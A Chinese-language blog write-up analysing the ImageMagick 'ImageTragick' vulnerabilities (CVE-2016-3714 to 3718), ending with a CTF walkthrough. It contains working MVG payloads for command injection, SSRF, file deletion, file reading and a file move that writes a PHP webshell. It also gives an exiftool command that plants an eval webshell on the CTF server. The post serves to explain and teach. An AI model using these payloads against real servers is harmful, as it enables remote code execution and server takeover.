---
title: ImageMagick命令执行漏洞（CVE-2016-3714）浅析
date: 2020-08-04 17:56:09
categories:
- Vulnerabilities
- WEB
tags:
- RCE
---
## 前言

&emsp;&emsp;在做CTF题的时候碰到一道图片上传漏洞的题，尝试了很久发现并不能绕过检测。经过大佬提示这道题玩的是ImageMagick命令执行漏洞，CVE编号CVE-2016-3714，所以就想去好好了解一下这个漏洞。

<!-- more -->

## ImageMagick

&emsp;&emsp;ImageMagick是一款功能强大，用户极多的开源图片处理软件，，可以用来读、写和处理多种格式的图片文件。很多网站开发者会调用这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等操作。

## 漏洞描述

&emsp;&emsp;ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。当攻击者构造含有恶意代码得图片时，ImageMagick库对于HTTPPS文件处理不当，没有做任何过滤，可远程实现远程命令执行，进而可能控制服务器。

&emsp;&emsp;相同问题触发的漏洞有很多，如CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714命令执行漏洞。

&emsp;&emsp;该漏洞影响范围为ImageMagick 6.9.3-9以前的所有版本。

## 漏洞分析

&emsp;&emsp;ImageMagick之所以支持那么多的文件格式,是因为它内置了非常多的图像处理库,对于这些图像处理库,ImageMagick给它起了个名字叫做”Delegate”(委托),每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。

&emsp;&emsp;在ImageMagick的默认配置文件里可以看到所有的委托：/etc/ImageMagick/delegates.xml

&emsp;&emsp;具体代码参考[这里](https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c)

&emsp;&emsp;该漏洞出现在mageMagick对https形式的文件处理的过程中，所以直接定位到https Delegate那里：

```XML
" <delegate decode=\"https\" command=\"&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;\"/>"
```

&emsp;&emsp;可以看到，command定义了它对于https文件处理时带入system()函数得命令：`"wget" -q -O "%o" "https:%M"`。有些版本可能使用的curl命令，问题还是一样的。

&emsp;&emsp;wget是从网络下载文件得命令，%M是一个占位符，被定义为输入的图片格式,也就是我们输入的url地址。但是由于只是做了简单的字符串拼接,没有做任何过滤，直接拼接到command命令中，所以我们可以将引号闭合后通过"|",”`”,”&”等带入其他命令,也就形成了命令注入。

&emsp;&emsp;比如我们传入如下代码：`https://test.com"|ls “-al`

&emsp;&emsp;则实际得system函数执行得命令为：`“wget” -q -O “%o” “ https://test.com"|ls “-al”`

&emsp;&emsp;这样，ls -al命令成功执行。

## 漏洞利用

&emsp;&emsp;ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，允许在其中加载ImageMagick中其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中,ImageMagick会自动根据其内容进行处理,也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式,这大大增加了漏洞的可利用场景。

&emsp;&emsp;所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令：

```Code
* push graphic-context
* viewbox 0 0 640 480
* fill 'url(https://"|id; ")'
* pop graphic-context
```

&emsp;&emsp;简单解释一下上面的POC：

* push和pop是用于堆栈的操作，一个进栈，一个出栈;

* viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;

* fill url()是把图片填充到当前元素内;

&emsp;&emsp;使用fill url()的形式调用存在漏洞的https delegate，当ImageMagick去处理这个文件时,漏洞就会被触发。

## 系列漏洞

&emsp;&emsp;CVE-2016-3718：利用mvg格式中可以包含url的特点，进行SSRF攻击。

```Code
* push graphic-context
* viewbox 0 0 640 480
* fill 'url(http://example.com/)'
* pop graphic-context
```

&emsp;&emsp;CVE-2016-3715：利用ImageMagick支持的ephemeral协议，来删除任意文件。

```Code
* push graphic-context
* viewbox 0 0 640 480
* image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
* popgraphic-context
```

&emsp;&emsp;CVE-2016-3716：利用ImageMagick支持的msl协议（读取一个msl格式的xml文件，并根据其内容执行一些操作），来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。

```Code
* file_move.mvg
* -=-=-=-=-=-=-=-=-
* push graphic-context
* viewbox 0 0 640 480
* image over 0,0 0,0 'msl:/tmp/msl.txt'
* popgraphic-context
* 
* /tmp/msl.txt
* -=-=-=-=-=-=-=-=-
* <?xml version="1.0" encoding="UTF-8"?>
* <image>
* <read filename="/tmp/image.gif" />
* <write filename="/var/www/shell.php" />
* </image>
```

&emsp;&emsp;CVE-2016-3717：本地文件读取漏洞。

```Code
* push graphic-context
* viewbox 0 0 640 480
* image over 0,0 0,0 'label:@/etc/hosts'
* pop graphic-context
```

## 漏洞扩展

&emsp;&emsp;PHP扩展『ImageMagick』也存在这个问题，而且只需要调用了Imagick类的构造方法，即可触发这个漏洞。

&emsp;&emsp;除了.mvg格式的图片以外，普通png格式的图片也能触发命令执行漏洞。在ImageMagick源码中除了%m，还有%l占位符，表示图片exif label信息：

```XML
<delegate decode="miff" encode="show" spawn="True" command="&quot;/usr/bin/display&quot; -delay 0 -window-group %[group] -title &quot;%l &quot; &quot;ephemeral:%i&quot;"/>
```

&emsp;&emsp;它将%l拼接进入了/usr/bin/display命令中，所以我只需将正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞：

```Code
* exiftool -label="\"|/usr/bin/id; \"" test.png
* convert test.png o.show
```

&emsp;&emsp;但这个方法鸡肋之处在于，因为delegate.xml中配置的encode=show（或win），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。

## 实例

&emsp;&emsp;最后回到那道CTF题：[Jarvis OJ - 图片上传漏洞](http://web.jarvisoj.com:32790/)。

&emsp;&emsp;通过网站目录扫描发现有和test.php界面，打开发现是phpinfo界面，其中开启了imagick模块：

![](/img/ImageMagick/ImageMagick1.png)

&emsp;&emsp;先用 exiftool 生成一个一句话后门，路径由 phpinfo 得到：

```Bash
exiftool -label="\"|/bin/echo \<?php \@eval\(\\$\_POST\[x\]\)\;?\> > /opt/lampp/htdocs/uploads/x.php; \"" normal.png 
```

&emsp;&emsp;然后上传图片：

![](/img/ImageMagick/ImageMagick2.png)

&emsp;&emsp;之后就是直接连接webshell或者找flag了：

![](/img/ImageMagick/ImageMagick3.png)